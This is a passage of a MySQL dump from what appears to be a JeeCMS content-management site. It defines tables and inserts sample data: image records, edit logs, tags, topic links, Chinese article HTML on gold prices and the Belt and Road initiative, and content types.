-- ----------------------------
-- Records of jc_content_picture
-- ----------------------------
INSERT INTO `jc_content_picture` VALUES (50, 0, '/menhu/u/cms/www/201901/25172326k9c0.png', '213123');
INSERT INTO `jc_content_picture` VALUES (50, 1, '/menhu/u/cms/www/201901/25172326fl3h.jpg', '3123');
INSERT INTO `jc_content_picture` VALUES (50, 2, '/menhu/u/cms/www/201901/25172326ey5a.jpg', '321321');
INSERT INTO `jc_content_picture` VALUES (51, 0, '/menhu/u/cms/www/201901/28165936gl84.jpg', '');
INSERT INTO `jc_content_picture` VALUES (51, 1, '/menhu/u/cms/www/201901/28165936tbo9.jpg', '');
INSERT INTO `jc_content_picture` VALUES (51, 2, '/menhu/u/cms/www/201901/281659368vl2.jpg', '');
INSERT INTO `jc_content_picture` VALUES (52, 0, '/menhu/u/cms/www/201901/28164634ip5j.jpg', '美女1');
INSERT INTO `jc_content_picture` VALUES (52, 1, '/menhu/u/cms/www/201901/28164634xdk4.jpg', '没女儿');
INSERT INTO `jc_content_picture` VALUES (52, 2, '/menhu/u/cms/www/201901/28164634mhsb.jpg', '美女三');

-- ----------------------------
-- Table structure for jc_content_record
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_record`;
CREATE TABLE `jc_content_record`  (
  `content_record_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `content_id` int(11) NOT NULL DEFAULT 0 COMMENT '文章ID',
  `user_id` int(11) NOT NULL DEFAULT 0 COMMENT '操作人',
  `operate_time` datetime NOT NULL COMMENT '操作时间',
  `operate_type` tinyint(2) NOT NULL DEFAULT 0 COMMENT '0 新增 1修改 2审核 3退回 4移动 5生成静态页 6删除到回收站 7归档 8出档 9推送共享',
  PRIMARY KEY (`content_record_id`) USING BTREE,
  INDEX `fk_index_jc_content_record_content`(`content_id`) USING BTREE,
  INDEX `fk_index_jc_content_record_user`(`user_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 37 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '文章操作记录' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_content_record
-- ----------------------------
INSERT INTO `jc_content_record` VALUES (1, 48, 1, '2019-01-25 14:43:20', 0);
INSERT INTO `jc_content_record` VALUES (2, 49, 1, '2019-01-25 17:17:13', 0);
INSERT INTO `jc_content_record` VALUES (3, 50, 1, '2019-01-25 17:19:33', 0);
INSERT INTO `jc_content_record` VALUES (4, 50, 1, '2019-01-25 17:23:34', 1);
INSERT INTO `jc_content_record` VALUES (5, 51, 1, '2019-01-25 17:29:50', 0);
INSERT INTO `jc_content_record` VALUES (6, 51, 1, '2019-01-25 17:30:16', 2);
INSERT INTO `jc_content_record` VALUES (7, 50, 1, '2019-01-25 17:30:16', 2);
INSERT INTO `jc_content_record` VALUES (8, 52, 1, '2019-01-25 17:31:30', 0);
INSERT INTO `jc_content_record` VALUES (9, 53, 1, '2019-01-28 10:16:59', 0);
INSERT INTO `jc_content_record` VALUES (10, 53, 1, '2019-01-28 10:18:21', 7);
INSERT INTO `jc_content_record` VALUES (11, 54, 1, '2019-01-28 10:20:42', 0);
INSERT INTO `jc_content_record` VALUES (12, 55, 1, '2019-01-28 10:20:43', 0);
INSERT INTO `jc_content_record` VALUES (13, 56, 1, '2019-01-28 10:20:45', 0);
INSERT INTO `jc_content_record` VALUES (14, 55, 1, '2019-01-28 10:20:53', 6);
INSERT INTO `jc_content_record` VALUES (15, 54, 1, '2019-01-28 10:20:55', 6);
INSERT INTO `jc_content_record` VALUES (16, 56, 1, '2019-01-28 10:21:33', 1);
INSERT INTO `jc_content_record` VALUES (17, 56, 1, '2019-01-28 10:22:37', 1);
INSERT INTO `jc_content_record` VALUES (18, 53, 1, '2019-01-28 14:37:52', 8);
INSERT INTO `jc_content_record` VALUES (19, 53, 1, '2019-01-28 14:42:13', 1);
INSERT INTO `jc_content_record` VALUES (20, 53, 1, '2019-01-28 14:42:50', 1);
INSERT INTO `jc_content_record` VALUES (21, 52, 1, '2019-01-28 16:31:12', 1);
INSERT INTO `jc_content_record` VALUES (22, 52, 1, '2019-01-28 16:31:51', 1);
INSERT INTO `jc_content_record` VALUES (23, 50, 1, '2019-01-28 16:32:00', 1);
INSERT INTO `jc_content_record` VALUES (24, 52, 1, '2019-01-28 16:33:06', 1);
INSERT INTO `jc_content_record` VALUES (25, 52, 1, '2019-01-28 16:33:25', 2);
INSERT INTO `jc_content_record` VALUES (26, 51, 1, '2019-01-28 16:33:25', 2);
INSERT INTO `jc_content_record` VALUES (27, 50, 1, '2019-01-28 16:33:25', 2);
INSERT INTO `jc_content_record` VALUES (28, 57, 1, '2019-01-28 16:42:00', 0);
INSERT INTO `jc_content_record` VALUES (29, 58, 1, '2019-01-28 16:42:02', 0);
INSERT INTO `jc_content_record` VALUES (30, 53, 1, '2019-01-28 16:44:08', 1);
INSERT INTO `jc_content_record` VALUES (31, 52, 1, '2019-01-28 16:45:21', 1);
INSERT INTO `jc_content_record` VALUES (32, 52, 1, '2019-01-28 16:45:41', 1);
INSERT INTO `jc_content_record` VALUES (33, 52, 1, '2019-01-28 16:46:00', 1);
INSERT INTO `jc_content_record` VALUES (34, 52, 1, '2019-01-28 16:46:54', 1);
INSERT INTO `jc_content_record` VALUES (35, 49, 1, '2019-01-28 16:48:24', 1);
INSERT INTO `jc_content_record` VALUES (36, 51, 1, '2019-01-28 16:59:38', 1);

-- ----------------------------
-- Table structure for jc_content_reward_fix
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_reward_fix`;
CREATE TABLE `jc_content_reward_fix`  (
  `content_id` int(11) NOT NULL DEFAULT 0,
  `priority` int(11) NOT NULL DEFAULT 10,
  `reward_fix` double NOT NULL DEFAULT 0 COMMENT '固定值',
  UNIQUE INDEX `jc_content_reward_fix`(`content_id`, `priority`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '内容打赏设置固定值' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_content_tag
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_tag`;
CREATE TABLE `jc_content_tag`  (
  `tag_id` int(11) NOT NULL AUTO_INCREMENT,
  `tag_name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT 'tag名称',
  `ref_counter` int(11) NOT NULL DEFAULT 1 COMMENT '被引用的次数',
  PRIMARY KEY (`tag_id`) USING BTREE,
  UNIQUE INDEX `ak_tag_name`(`tag_name`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 476 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容TAG表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_content_tag
-- ----------------------------
INSERT INTO `jc_content_tag` VALUES (212, '百度', 0);
INSERT INTO `jc_content_tag` VALUES (235, '匹', 0);
INSERT INTO `jc_content_tag` VALUES (298, '双休', 1);
INSERT INTO `jc_content_tag` VALUES (345, '南瓜', 0);
INSERT INTO `jc_content_tag` VALUES (398, '妖', 0);
INSERT INTO `jc_content_tag` VALUES (399, '倾城', 0);
INSERT INTO `jc_content_tag` VALUES (414, '诗', 0);
INSERT INTO `jc_content_tag` VALUES (435, '高性能', 1);
INSERT INTO `jc_content_tag` VALUES (436, '年终奖', 1);
INSERT INTO `jc_content_tag` VALUES (437, '五险一金', 1);
INSERT INTO `jc_content_tag` VALUES (438, '带薪年假', 1);
INSERT INTO `jc_content_tag` VALUES (439, '节日福利', 1);
INSERT INTO `jc_content_tag` VALUES (440, '黄金', 0);
INSERT INTO `jc_content_tag` VALUES (441, '空军', 0);
INSERT INTO `jc_content_tag` VALUES (443, '一带', 1);
INSERT INTO `jc_content_tag` VALUES (444, '一路', 1);
INSERT INTO `jc_content_tag` VALUES (445, '习近平', 1);
INSERT INTO `jc_content_tag` VALUES (446, '打开', 1);
INSERT INTO `jc_content_tag` VALUES (447, '筑', 1);
INSERT INTO `jc_content_tag` VALUES (448, '梦', 1);
INSERT INTO `jc_content_tag` VALUES (449, '空间', 1);
INSERT INTO `jc_content_tag` VALUES (450, '北京', 0);
INSERT INTO `jc_content_tag` VALUES (451, '特', 0);
INSERT INTO `jc_content_tag` VALUES (452, '战', 0);
INSERT INTO `jc_content_tag` VALUES (453, '队员', 0);
INSERT INTO `jc_content_tag` VALUES (454, '魔鬼', 0);
INSERT INTO `jc_content_tag` VALUES (455, '周', 0);
INSERT INTO `jc_content_tag` VALUES (456, '训练', 0);
INSERT INTO `jc_content_tag` VALUES (457, '挑战', 0);
INSERT INTO `jc_content_tag` VALUES (458, '50项', 0);
INSERT INTO `jc_content_tag` VALUES (459, '最', 0);
INSERT INTO `jc_content_tag` VALUES (460, '严苛', 0);
INSERT INTO `jc_content_tag` VALUES (461, '极限', 0);
INSERT INTO `jc_content_tag` VALUES (462, '项目', 0);
INSERT INTO `jc_content_tag` VALUES (463, '中国空军', 0);
INSERT INTO `jc_content_tag` VALUES (464, '航空兵', 0);
INSERT INTO `jc_content_tag` VALUES (465, '赴', 0);
INSERT INTO `jc_content_tag` VALUES (466, '南海', 0);
INSERT INTO `jc_content_tag` VALUES (467, '常态', 0);
INSERT INTO `jc_content_tag` VALUES (468, '化', 0);
INSERT INTO `jc_content_tag` VALUES (469, '战斗', 0);
INSERT INTO `jc_content_tag` VALUES (470, '巡航', 0);
INSERT INTO `jc_content_tag` VALUES (471, '大妈', 0);
INSERT INTO `jc_content_tag` VALUES (472, '托盘', 0);
INSERT INTO `jc_content_tag` VALUES (473, '黑客', 0);
INSERT INTO `jc_content_tag` VALUES (474, '啤酒', 0);
INSERT INTO `jc_content_tag` VALUES (475, '女人', 0);

-- ----------------------------
-- Table structure for jc_content_topic
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_topic`;
CREATE TABLE `jc_content_topic`  (
  `content_id` int(11) NOT NULL,
  `topic_id` int(11) NOT NULL,
  PRIMARY KEY (`content_id`, `topic_id`) USING BTREE,
  INDEX `fk_jc_content_topic`(`topic_id`) USING BTREE,
  CONSTRAINT `fk_jc_content_topic` FOREIGN KEY (`topic_id`) REFERENCES `jc_topic` (`topic_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_topic_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS专题内容关联表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_content_topic
-- ----------------------------
INSERT INTO `jc_content_topic` VALUES (48, 4);
INSERT INTO `jc_content_topic` VALUES (49, 4);
INSERT INTO `jc_content_topic` VALUES (52, 4);
INSERT INTO `jc_content_topic` VALUES (49, 5);
INSERT INTO `jc_content_topic` VALUES (52, 5);
INSERT INTO `jc_content_topic` VALUES (54, 5);
INSERT INTO `jc_content_topic` VALUES (55, 5);
INSERT INTO `jc_content_topic` VALUES (56, 5);
INSERT INTO `jc_content_topic` VALUES (49, 6);
INSERT INTO `jc_content_topic` VALUES (50, 6);
INSERT INTO `jc_content_topic` VALUES (52, 6);

-- ----------------------------
-- Table structure for jc_content_txt
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_txt`;
CREATE TABLE `jc_content_txt`  (
  `content_id` int(11) NOT NULL,
  `txt` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '文章内容',
  `txt1` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '扩展内容1',
  `txt2` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '扩展内容2',
  `txt3` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '扩展内容3',
  PRIMARY KEY (`content_id`) USING BTREE,
  CONSTRAINT `fk_jc_txt_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容文本表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_content_txt
-- ----------------------------
INSERT INTO `jc_content_txt` VALUES (47, '<p>1、大专或大专以上应往届毕业生&nbsp;</p><p>2、理工类毕业生，计算机相关专业优先<br/></p><p>3、对软件行业有强烈的兴趣<br/></p><p>4、有良好的执行力，致力于软件行业发展<br/></p><p>5、后期发展从事网页设计，网站美工，网站开发，互联网系统开发等方向</p><p><br/></p>', NULL, NULL, NULL);
INSERT INTO `jc_content_txt` VALUES (49, '<p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; color: rgb(32, 32, 32); font-family: &quot;Microsoft Yahei&quot;, &quot;Lucida Grande&quot;, Tahoma, Arial, Helvetica, sans-serif; white-space: normal; text-align: center;\"><img title=\"908fa0ec08fa513da2f6fc21356d55fbb3fbd9f5.jpg\" alt=\"908fa0ec08fa513da2f6fc21356d55fbb3fbd9f5.jpg\" src=\"http://127.0.0.1:8080/menhu/u/cms/www/201901/25171710935e.jpg\" style=\"border: 0px; vertical-align: middle; max-width: 90%;\"/></p><ol class=\"custom_num list-paddingleft-1\" style=\"padding-top: 0px; padding-right: 0px; padding-bottom: 0px; border: 0px; color: rgb(32, 32, 32); font-family: &quot;Microsoft Yahei&quot;, &quot;Lucida Grande&quot;, Tahoma, Arial, Helvetica, sans-serif; white-space: normal;\"><li class=\"list-num-1-1 list-num-paddingleft-1\" style=\"\"><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px;\"><br/></p></li></ol><ol class=\" list-paddingleft-2\" style=\"padding: 0px; border: 0px; list-style-position: initial; list-style-image: initial; color: rgb(32, 32, 32); font-family: &quot;Microsoft Yahei&quot;, &quot;Lucida Grande&quot;, Tahoma, Arial, Helvetica, sans-serif; white-space: normal;\"><li><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; text-indent: 2em;\"><span style=\"color: rgb(255, 0, 0);\">三年前，中国大妈们抢购黄金的记忆还历历在目，没想到如今的黄金又开始了一轮又一轮的下跌。接连的破位下跌，再次有人开始蠢蠢欲动，想着投资抄底，再加上中国房地产市场的调控力度不断加大，那么会不会有一部分投资热钱也会进入到黄金市场呢？其实，投资市场历来有句名言是买涨不买跌。不过，对于黄金这种相对常见的避险投资工具来说，很多人买了就是资产配置和“囤货”，并不是简单的投资或者快速的出手，她们持有的耐心和时间更长，因此任何一个低价的出现，都有可能成为触发市场投资的一种诱惑。</span></p></li><li><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; text-indent: 2em;\"><br/></p></li><li><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; text-indent: 2em;\">连续下跌，何时是个头？</p></li><li><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; text-indent: 2em;\"><br/></p></li><li><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; text-indent: 2em;\">今年的“十一黄金周”期间，黄金价格已经跌破1,300美元/盎司的重要支撑。10月1日～7日，纽约商业交易所（COMEX）黄金大跌4.5%，创下一年来最大单周跌幅，其中上周二跌幅超过3.3%，也创下了2013年12月以来单日最大跌幅。10月4日，现货金价一度跌破1270美元/盎司关口，白银一度跌破18美元关口，跌幅超过5%，多次刷新英国脱欧公投以来最低。市场对欧佩克限产协议不断炒作，原油看涨情绪升温。这都使黄金的价格不被看好。</p></li><li><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; text-indent: 2em;\"><br/></p></li><li><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; text-indent: 2em;\">市场对全球央行货币政策转向，担忧流动性逆转是黄金下跌的主要原因。其实在8月份之后，全球资本市场人士普遍猜测，各国将统一行动，主要在结构性改革、财政政策上发力，货币政策可能接近极限，全球的流动性将很快出现逆转。黄金价格的剧烈波动，就是对这一猜测的又一次市场反应。如果全球货币宽松走到尽头，那么利率将缓慢上升，全球的债券牛市也将终结。</p></li></ol><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; color: rgb(32, 32, 32); font-family: &quot;Microsoft Yahei&quot;, &quot;Lucida Grande&quot;, Tahoma, Arial, Helvetica, sans-serif; white-space: normal; text-indent: 2em;\"><br/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; border: 0px; color: rgb(32, 32, 32); font-family: &quot;Microsoft Yahei&quot;, &quot;Lucida Grande&quot;, Tahoma, Arial, Helvetica, sans-serif; white-space: normal; text-indent: 2em;\">摩根大通统计的数据显示，今年英国退欧公投后，欧英日三大央行的季度资产购买规模连创新高。目前美欧英日四大央行的资产负债表已高达13万亿美元之巨，已占全球GDP的40%。预计在今年最后一个季度，欧英日三大央行将“加印”5060亿美元在市场上购买资产，创2009年美联储首推QE以来的最大季度规模。高盛表示，基于全球经济增长仍面临持续下行风险，同时市场可能仍在质疑货币政策应对任何经济潜在冲击的能力。因此，金价跌破每盎司1250美元可能是一个战略性的购买机会。</p><p><br/></p>', NULL, NULL, NULL);
INSERT INTO `jc_content_txt` VALUES (50, '<p><a href=\"http://demo.jeecms.com/pic/13.jhtml#\" style=\"text-decoration-line: none; color: rgb(51, 51, 51); cursor: pointer; font-family: &quot;Microsoft Yahei&quot;, &quot;Lucida Grande&quot;, Tahoma, Arial, Helvetica, sans-serif; font-size: 14px; text-align: center; white-space: normal; background-color: rgb(249, 249, 249);\"><img src=\"http://127.0.0.1:8080/menhu/u/cms/www/201901/25171931axpy.jpg\" alt=\"\" id=\"pic1\" curindex=\"0\" style=\"border: none; vertical-align: middle; max-width: 950px; max-height: 630px;\"/></a></p>', NULL, NULL, NULL);
INSERT INTO `jc_content_txt` VALUES (51, '<p><img src=\"/menhu/u/cms/www/201901/28165927stq8.jpg\" style=\"\" title=\"c1595e21fcdfc331369c5f8111bb62a4.jpg\"/></p><p><img src=\"/menhu/u/cms/www/201901/2816592738x4.JPG\" style=\"\" title=\"FLAMING MOUNTAIN.JPG\"/></p><p><img src=\"/menhu/u/cms/www/201901/281659273q7z.JPG\" style=\"\" title=\"FLAMING MOUNTAIN (1).JPG\"/></p><p><br/></p>', NULL, NULL, NULL);
INSERT INTO `jc_content_txt` VALUES (52, '<p><img src=\"/menhu/u/cms/www/201901/28164538fzdp.jpg\" style=\"\" title=\"aa874e8b4e72fd88325b07b1c2a8b7cf.jpg\"/></p><p><img src=\"/menhu/u/cms/www/201901/28164538ks89.jpg\" style=\"\" title=\"abe461c222a87deb848e7f34e9003f71.jpg\"/></p><p><img src=\"/menhu/u/cms/www/201901/28164538tqj5.jpg\" style=\"\" title=\"b28bc88b6e4913ce6a9df9c19216daf5.jpg\"/></p><p><img src=\"/menhu/u/cms/www/201901/28164538402m.jpg\" style=\"\" title=\"c1595e21fcdfc331369c5f8111bb62a4.jpg\"/></p><p><br/></p>', NULL, NULL, NULL);
INSERT INTO `jc_content_txt` VALUES (53, '<p><img src=\"/menhu/u/cms/www/201901/28100345z6mz.jpg\" style=\"\" title=\"abe461c222a87deb848e7f34e9003f71.jpg\"/></p><p><img src=\"/menhu/u/cms/www/201901/28100345pgv7.jpg\" style=\"\" title=\"b28bc88b6e4913ce6a9df9c19216daf5.jpg\"/></p><p><img src=\"/menhu/u/cms/www/201901/28100345ym49.jpg\" style=\"\" title=\"aa874e8b4e72fd88325b07b1c2a8b7cf.jpg\"/></p><p><img src=\"/menhu/u/cms/www/201901/28100345auup.jpg\" style=\"\" title=\"c1595e21fcdfc331369c5f8111bb62a4.jpg\"/></p><p><br/></p>', NULL, NULL, NULL);
INSERT INTO `jc_content_txt` VALUES (54, '<p><img src=\"/menhu/u/cms/www/201901/2810203854tx.jpg\" style=\"\" title=\"60da7fd2c7e2612cd669b2c8bf3d8c3c.jpg\"/></p><p><img src=\"/menhu/u/cms/www/201901/281020389p9w.jpg\" style=\"\" title=\"296cc8d725829e5cbe238995fdaa0dfe.jpg\"/></p><p><img src=\"/menhu/u/cms/www/201901/28102038tfc5.jpg\" style=\"\" title=\"c1595e21fcdfc331369c5f8111bb62a4.jpg\"/></p><p><br/></p>', NULL, NULL, NULL);
INSERT INTO `jc_content_txt` VALUES (55, '<p><img src=\"/menhu/u/cms/www/201901/2810203854tx.jpg\" style=\"\" title=\"60da7fd2c7e2612cd669b2c8bf3d8c3c.jpg\"/></p><p><img src=\"/menhu/u/cms/www/201901/281020389p9w.jpg\" style=\"\" title=\"296cc8d725829e5cbe238995fdaa0dfe.jpg\"/></p><p><img src=\"/menhu/u/cms/www/201901/28102038tfc5.jpg\" style=\"\" title=\"c1595e21fcdfc331369c5f8111bb62a4.jpg\"/></p><p><br/></p>', NULL, NULL, NULL);
INSERT INTO `jc_content_txt` VALUES (56, '<p><img src=\"/menhu/u/cms/www/201901/2810203854tx.jpg\" style=\"\" title=\"60da7fd2c7e2612cd669b2c8bf3d8c3c.jpg\"/></p><p><img src=\"/menhu/u/cms/www/201901/281020389p9w.jpg\" style=\"\" title=\"296cc8d725829e5cbe238995fdaa0dfe.jpg\"/></p><p><img src=\"/menhu/u/cms/www/201901/28102038tfc5.jpg\" style=\"\" title=\"c1595e21fcdfc331369c5f8111bb62a4.jpg\"/></p><p><br/></p>', NULL, NULL, NULL);
INSERT INTO `jc_content_txt` VALUES (57, '<p style=\"white-space: normal; text-indent: 2em;\">【学习进行时】在不久前举行的推进“一带一路”建设工作座谈会上，习近平要求：“以钉钉子精神抓下去，一步一步把‘一带一路’建设推向前进，让‘一带一路’建设造福沿线各国人民。”</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">习近平为何如此看重“一带一路”建设？自他发出沿线国家和地区共建“一带一路”倡议三年来，都取得了哪些进展？</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">6月22日，国家主席习近平在塔什干乌兹别克斯坦最高会议立法院发表题为《携手共创丝绸之路新辉煌》的重要演讲。 新华社记者马占成摄</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">2013年9月7日，习近平在出访中亚国家期间，首次提出共建“丝绸之路经济带”。同年10月，他又提出共同建设21世纪“海上丝绸之路”，二者共同构成了“一带一路”重大倡议。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">而今，三年了。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\"><strong>“一带一路”这三年</strong></p><p style=\"white-space: normal; text-indent: 2em;\"><strong><br/></strong></p><p style=\"white-space: normal; text-indent: 2em;\">三年，筚路蓝缕，春华秋实。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">在“一带一路”倡议提出的当年11月，十八届三中全会通过的《中共中央关于全面深化改革若干重大问题的决定》明确指出：“加快同周边国家和区域基础设施互联互通建设，推进丝绸之路经济带、海上丝绸之路建设，形成全方位开放新格局。”</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">2014年11月的中央财经领导小组第八次会议专门研究了丝绸之路经济带和21世纪海上丝绸之路规划，发起建立亚洲基础设施投资银行和设立丝路基金。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">在博鳌亚洲论坛2015年年会上，习近平呼吁各国积极参与“一带一路”建设。随后，中国政府发布《推动共建丝绸之路经济带和21世纪海上丝绸之路的愿景与行动》，明确了“一带一路”的共建原则、框架思路、合作重点、合作机制等。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">2016年3月，国家“十三五”规划纲要正式发布，“推进‘一带一路’建设”成为其中专门一章。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">2016年8月，习近平在推进“一带一路”建设工作座谈会上，进一步提出8项要求。从统一思想到统筹落实，从金融创新到人文合作，从话语体系建设到安全保障，面面俱到。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">三年，蓝图由草创到一步步展开、一笔笔绘就。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">目前，已有100多个国家和国际组织参与到“一带一路”建设中来，中国同30多个沿线国家签署了共建合作协议、同20多个国家开展了国际产能合作，联合国等国际组织也态度积极，以亚投行、丝路基金为代表的金融合作不断深入，一批有影响力的标志性项目逐步落地。“一带一路”建设从无到有、由点及面，进度和成果超出预期。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">“一带一路”东联亚太经济圈，西接欧洲经济圈，跨越高山深海，正在逐步构建世界上最壮美的经济走廊。</p><p><br/></p>', NULL, NULL, NULL);
INSERT INTO `jc_content_txt` VALUES (58, '<p style=\"white-space: normal; text-indent: 2em;\">【学习进行时】在不久前举行的推进“一带一路”建设工作座谈会上，习近平要求：“以钉钉子精神抓下去，一步一步把‘一带一路’建设推向前进，让‘一带一路’建设造福沿线各国人民。”</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">习近平为何如此看重“一带一路”建设？自他发出沿线国家和地区共建“一带一路”倡议三年来，都取得了哪些进展？</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">6月22日，国家主席习近平在塔什干乌兹别克斯坦最高会议立法院发表题为《携手共创丝绸之路新辉煌》的重要演讲。 新华社记者马占成摄</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">2013年9月7日，习近平在出访中亚国家期间，首次提出共建“丝绸之路经济带”。同年10月，他又提出共同建设21世纪“海上丝绸之路”，二者共同构成了“一带一路”重大倡议。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">而今，三年了。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\"><strong>“一带一路”这三年</strong></p><p style=\"white-space: normal; text-indent: 2em;\"><strong><br/></strong></p><p style=\"white-space: normal; text-indent: 2em;\">三年，筚路蓝缕，春华秋实。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">在“一带一路”倡议提出的当年11月，十八届三中全会通过的《中共中央关于全面深化改革若干重大问题的决定》明确指出：“加快同周边国家和区域基础设施互联互通建设，推进丝绸之路经济带、海上丝绸之路建设，形成全方位开放新格局。”</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">2014年11月的中央财经领导小组第八次会议专门研究了丝绸之路经济带和21世纪海上丝绸之路规划，发起建立亚洲基础设施投资银行和设立丝路基金。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">在博鳌亚洲论坛2015年年会上，习近平呼吁各国积极参与“一带一路”建设。随后，中国政府发布《推动共建丝绸之路经济带和21世纪海上丝绸之路的愿景与行动》，明确了“一带一路”的共建原则、框架思路、合作重点、合作机制等。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">2016年3月，国家“十三五”规划纲要正式发布，“推进‘一带一路’建设”成为其中专门一章。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">2016年8月，习近平在推进“一带一路”建设工作座谈会上，进一步提出8项要求。从统一思想到统筹落实，从金融创新到人文合作，从话语体系建设到安全保障，面面俱到。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">三年，蓝图由草创到一步步展开、一笔笔绘就。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">目前，已有100多个国家和国际组织参与到“一带一路”建设中来，中国同30多个沿线国家签署了共建合作协议、同20多个国家开展了国际产能合作，联合国等国际组织也态度积极，以亚投行、丝路基金为代表的金融合作不断深入，一批有影响力的标志性项目逐步落地。“一带一路”建设从无到有、由点及面，进度和成果超出预期。</p><p style=\"white-space: normal; text-indent: 2em;\"><br/></p><p style=\"white-space: normal; text-indent: 2em;\">“一带一路”东联亚太经济圈，西接欧洲经济圈，跨越高山深海，正在逐步构建世界上最壮美的经济走廊。</p><p><br/></p>', NULL, NULL, NULL);

-- ----------------------------
-- Table structure for jc_content_type
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_type`;
CREATE TABLE `jc_content_type`  (
  `type_id` int(11) NOT NULL,
  `type_name` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `img_width` int(11) NULL DEFAULT NULL COMMENT '图片宽',
  `img_height` int(11) NULL DEFAULT NULL COMMENT '图片高',
  `has_image` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否有图片',
  `is_disabled` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否禁用',
  PRIMARY KEY (`type_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容类型表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_content_type
-- ----------------------------
INSERT INTO `jc_content_type` VALUES (1, '普通', 100, 100, 0, 0);
INSERT INTO `jc_content_type` VALUES (2, '图文', 510, 288, 1, 0);
INSERT INTO `jc_content_type` VALUES (3, '焦点', 280, 200, 1, 0);
